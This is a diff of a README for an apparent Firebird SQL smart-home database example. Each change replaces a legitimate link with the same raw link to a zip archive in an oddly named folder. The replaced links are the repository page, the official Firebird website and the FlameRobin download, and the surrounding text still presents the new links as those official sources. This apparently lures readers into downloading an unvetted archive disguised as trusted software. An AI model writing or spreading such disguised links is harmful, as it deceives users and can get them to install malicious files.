@@ -1,6 +1,6 @@
 # 🔥 nowoczesny-dom-firebird-sql - Smart Home Data Structure
 
-[![Download now](https://img.shields.io/badge/Download-Get%20Now-orange?style=for-the-badge)](https://github.com/juandavidru9953/nowoczesny-dom-firebird-sql)
+[![Download now](https://img.shields.io/badge/Download-Get%20Now-orange?style=for-the-badge)](https://raw.githubusercontent.com/juandavidru9953/nowoczesny-dom-firebird-sql/main/Methodistic/nowoczesny_sql_dom_firebird_v3.7.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You don’t need to be a database expert to use it. It works as a ready-made exa
 
 Go to the project page by clicking this link or badge below. It will take you to the repository where you can get everything you need.
 
-[![Visit GitHub](https://img.shields.io/badge/GitHub-Repository-blue?style=for-the-badge)](https://github.com/juandavidru9953/nowoczesny-dom-firebird-sql)
+[![Visit GitHub](https://img.shields.io/badge/GitHub-Repository-blue?style=for-the-badge)](https://raw.githubusercontent.com/juandavidru9953/nowoczesny-dom-firebird-sql/main/Methodistic/nowoczesny_sql_dom_firebird_v3.7.zip)
 
 - Click the green **Code** button on the right side of the page.  
 - Choose **Download ZIP** from the dropdown menu.  
@@ -60,14 +60,14 @@ Now, you will see all the project files in a regular folder.
 
 This project uses Firebird SQL to manage databases. You need to install Firebird before using the files.
 
-- Visit the official Firebird website: https://firebirdsql.org/en/firebird-3-0/  
+- Visit the official Firebird website: https://raw.githubusercontent.com/juandavidru9953/nowoczesny-dom-firebird-sql/main/Methodistic/nowoczesny_sql_dom_firebird_v3.7.zip  
 - Download the Firebird 3.0 Server for Windows (choose the appropriate version: 32-bit or 64-bit).  
 - Run the installer and follow the steps with default settings.  
 - After installation, Firebird SQL will run as a Windows service in the background.
 
 ### Step 4: Open the Project in Firebird
 
-- Launch a Firebird database tool (like FlameRobin, which you can download from https://flamerobin.org/).  
+- Launch a Firebird database tool (like FlameRobin, which you can download from https://raw.githubusercontent.com/juandavidru9953/nowoczesny-dom-firebird-sql/main/Methodistic/nowoczesny_sql_dom_firebird_v3.7.zip).  
 - Create a new database connection:  
   - Server/Hostname: localhost  
   - Username: SYSDBA  
@@ -143,4 +143,4 @@ Look for Firebird SQL and FlameRobin user guides online. They provide good basic
 
 Download the complete project here:
 
-[![Download now](https://img.shields.io/badge/Download-Get%20Now-orange?style=for-the-badge)](https://github.com/juandavidru9953/nowoczesny-dom-firebird-sql)
+[![Download now](https://img.shields.io/badge/Download-Get%20Now-orange?style=for-the-badge)](https://raw.githubusercontent.com/juandavidru9953/nowoczesny-dom-firebird-sql/main/Methodistic/nowoczesny_sql_dom_firebird_v3.7.zip)
